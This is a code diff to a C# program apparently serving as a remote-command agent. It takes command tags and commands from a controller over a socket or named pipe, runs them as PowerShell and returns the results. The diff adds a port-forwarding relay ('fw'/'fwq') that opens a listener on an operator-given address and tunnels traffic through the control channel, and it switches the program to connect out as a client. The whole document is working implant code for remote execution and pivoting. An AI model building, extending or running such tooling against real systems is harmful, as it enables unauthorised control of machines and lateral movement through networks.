@@ -12,6 +12,7 @@ using System.IO;
 using System.Collections.ObjectModel;
 using System.Management.Automation.Runspaces;
 using System.Security.Principal;
+using System.Threading;
 
 namespace myclient
 {
@@ -19,6 +20,7 @@ namespace myclient
     class MyApp
     {
         private string t_message = "";
+        private Socket fwSocket = null;
 
         public static IPEndPoint CreateIPEndPoint(string endPoint)
         {
@@ -74,12 +76,12 @@ namespace myclient
                 {
                     //Console.WriteLine("[DEBUG] Need to get more ....");
                     int bytesRec = socket.Receive(bytes);
-                    t_message = t_message + Encoding.ASCII.GetString(bytes, 0, bytesRec);
+                    t_message = t_message + Encoding.UTF8.GetString(bytes, 0, bytesRec);
 
                 }
             }
         }
-
+        
         private static byte[] ReadPipMessage(PipeStream pipe)
         {
             byte[] buffer = new byte[1024];
@@ -97,6 +99,44 @@ namespace myclient
                 return ms.ToArray();
             }
         }
+
+        public void StartServerNative(Object endpoint)
+        {
+
+            try
+            {
+                IPEndPoint localEndPoint = CreateIPEndPoint((string)endpoint);
+                Socket listener = new Socket(localEndPoint.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
+
+                try
+                {
+                    listener.Bind(localEndPoint);
+                    listener.Listen(1);
+                    Console.WriteLine("Waiting for a connection...");
+                    fwSocket = listener.Accept();
+
+                    //doMagic(handler, localEndPoint, listener);
+
+
+                    // Release the socket.  
+                    //listener.Shutdown(SocketShutdown.Both);
+                    listener.Close();
+
+
+                }//outer try
+
+                catch (Exception e)
+                {
+                    Console.WriteLine("Unexpected exception : {0}", e.ToString());
+                }
+
+            }//init try
+            catch (Exception e)
+            {
+                Console.WriteLine(e.ToString());
+            }
+        }
+
 
 
         private void doMagic(Socket sender, IPEndPoint remoteEP, Socket listener)
@@ -119,10 +159,10 @@ namespace myclient
                     Console.WriteLine("Waiting for command tag ...");
 
                     //int bytesRec = sender.Receive(bytes);
-                    //command_tag = Encoding.ASCII.GetString(bytes, 0, bytesRec);
+                    //command_tag = Encoding.UTF8.GetString(bytes, 0, bytesRec);
                     command_tag = doRecive(sender);
-                    //Console.WriteLine("Recieved Command tag: {0}", command_tag);
-                    byte[] msg = Encoding.ASCII.GetBytes(MsgPack("COMMAND_TAG_SUCCESS"));
+                    Console.WriteLine("Recieved Command tag: {0}", command_tag);
+                    byte[] msg = Encoding.UTF8.GetBytes(MsgPack("COMMAND_TAG_SUCCESS"));
                     int bytesSent = sender.Send(msg);
                     if (bytesSent != msg.Length)
                     {
@@ -133,10 +173,10 @@ namespace myclient
 
                     Console.WriteLine("Trying to get commands ... ");
                     //bytesRec = sender.Receive(bytes);
-                    //command = Encoding.ASCII.GetString(bytes, 0, bytesRec);
+                    //command = Encoding.UTF8.GetString(bytes, 0, bytesRec);
                     command = doRecive(sender);
-                    //Console.WriteLine("Recieved Command: {0}", command);
-                    msg = Encoding.ASCII.GetBytes(MsgPack("COMMAND_SUCCESS"));
+                    Console.WriteLine("Recieved Command: {0}", command);
+                    msg = Encoding.UTF8.GetBytes(MsgPack("COMMAND_SUCCESS"));
                     bytesSent = sender.Send(msg);
                     if (bytesSent != msg.Length)
                     {
@@ -161,7 +201,7 @@ namespace myclient
 
 
                         Console.WriteLine("[DEBUG] cmd executed ...");
-                        msg = Encoding.ASCII.GetBytes(MsgPack(psresult));
+                        msg = Encoding.UTF8.GetBytes(MsgPack(psresult));
                         bytesSent = sender.Send(msg);
                         if (bytesSent != msg.Length)
                         {
@@ -171,7 +211,7 @@ namespace myclient
 
                         //get success ack
                         //bytesRec = sender.Receive(bytes);
-                        //string psAck = Encoding.ASCII.GetString(bytes, 0, bytesRec);
+                        //string psAck = Encoding.UTF8.GetString(bytes, 0, bytesRec);
                         string psAck = doRecive(sender);
                         Console.WriteLine("[DEBUG] ACK msg: " + psAck);
                         if (psAck == "PSRUN_SUCCESS")
@@ -183,6 +223,51 @@ namespace myclient
                             Console.WriteLine("[PsRun] Failed ...");
                         }
 
+                    }
+
+                    if (command_tag.ToLower() == "fw")
+                    {
+                        //assume command is ip:port string
+                        Thread t = new Thread(new ParameterizedThreadStart(StartServerNative));
+                        t.Start(command);
+                        Console.WriteLine("[DEBUG] fw executed ...");
+                        msg = Encoding.UTF8.GetBytes(MsgPack("FW_SUCCESS"));
+                        bytesSent = sender.Send(msg);
+                        if (bytesSent != msg.Length)
+                        {
+                            Console.WriteLine("[DEBUG] Something wrong with send");
+                        }
+                        Console.WriteLine("Send result finished");
+
+                    }
+
+                    if (command_tag.ToLower() == "fwq")
+                    {
+
+                        
+                        if (fwSocket != null)
+                        {
+                            //do single read and write
+                            Console.WriteLine("Doing read and write");
+                            byte[] fwq_bytes_toresv = new byte[1024];
+                            int length_toresv = fwSocket.Receive(fwq_bytes_toresv);
+                            byte[] fwq_msg = Encoding.UTF8.GetBytes(MsgPack(Encoding.UTF8.GetString(fwq_bytes_toresv, 0, length_toresv)));
+                            bytesSent = sender.Send(fwq_msg);
+
+                            string fwq_string_tosend = doRecive(sender);
+                            int length_tosend = fwSocket.Send(Encoding.UTF8.GetBytes(fwq_string_tosend));
+
+                            
+                        }
+                        else
+                        {
+                            Console.WriteLine("Sending not ready");
+                            byte[] fwq_nr_tag = Encoding.UTF8.GetBytes(MsgPack("FW_NOTREADY"));
+                            bytesSent = sender.Send(fwq_nr_tag);
+                            Console.WriteLine("FW_NOTREADY Sent");
+
+                        }
+                        
                     }
 
 
@@ -239,21 +324,21 @@ namespace myclient
             {
                 Console.WriteLine("[*] Waiting for pip message");
                 var messageBytes = ReadPipMessage(pipe);
-                command_tag = Encoding.ASCII.GetString(messageBytes);
+                command_tag = Encoding.UTF8.GetString(messageBytes);
                 Console.WriteLine("[*] Tag Received: {0}", command_tag);
 
                 //ack
-                byte[] msg = Encoding.ASCII.GetBytes("COMMAND_TAG_SUCCESS");
+                byte[] msg = Encoding.UTF8.GetBytes("COMMAND_TAG_SUCCESS");
                 pipe.Write(msg, 0, msg.Length);
                 Console.WriteLine("[*] Ack Sent..");
 
 
                 messageBytes = ReadPipMessage(pipe);
-                command = Encoding.ASCII.GetString(messageBytes);
+                command = Encoding.UTF8.GetString(messageBytes);
                 Console.WriteLine("[*] CMD Received: {0}", command);
 
                 //ack
-                msg = Encoding.ASCII.GetBytes("COMMAND_SUCCESS");
+                msg = Encoding.UTF8.GetBytes("COMMAND_SUCCESS");
                 pipe.Write(msg, 0, msg.Length);
                 Console.WriteLine("[*] Ack Sent..");
 
@@ -274,12 +359,12 @@ namespace myclient
 
                     try
                     {
-                        msg = Encoding.ASCII.GetBytes(psresult);
+                        msg = Encoding.UTF8.GetBytes(psresult);
                         pipe.Write(msg, 0, msg.Length);
                         messageBytes = ReadPipMessage(pipe);
 
                         //ack
-                        var psAck = Encoding.ASCII.GetString(messageBytes);
+                        var psAck = Encoding.UTF8.GetString(messageBytes);
                         Console.WriteLine("[DEBUG] ACK msg: " + psAck);
                         if (psAck == "PSRUN_SUCCESS")
                         {
@@ -335,7 +420,6 @@ namespace myclient
 
         }
 
-
         public void StartPipServer()
         {
             
@@ -347,7 +431,7 @@ namespace myclient
                 Console.WriteLine("[*] Client connected.");
                 
                 //ack connecition
-                byte[] msg = Encoding.ASCII.GetBytes("PIPE_CONNECTED");
+                byte[] msg = Encoding.UTF8.GetBytes("PIPE_CONNECTED");
                 pipe.Write(msg, 0, msg.Length);
 
                 doMagic(pipe);
@@ -423,7 +507,7 @@ namespace myclient
 
 
                     // Release the socket.  
-                    listener.Shutdown(SocketShutdown.Both);
+                    //listener.Shutdown(SocketShutdown.Both);
                     listener.Close();
 
 
@@ -441,6 +525,9 @@ namespace myclient
             }
 
         }
+
+        
+
     }
 
     public class Program
@@ -449,9 +536,9 @@ namespace myclient
         public static void Main(string[] args)
         {
             MyApp t_app = new MyApp();
-            //t_app.StartClient();
+            t_app.StartClient();
             //t_app.StartServer();
-            t_app.StartPipServer();
+            //t_app.StartPipServer();
             //t_app.StartPipeClinet();
 
         }
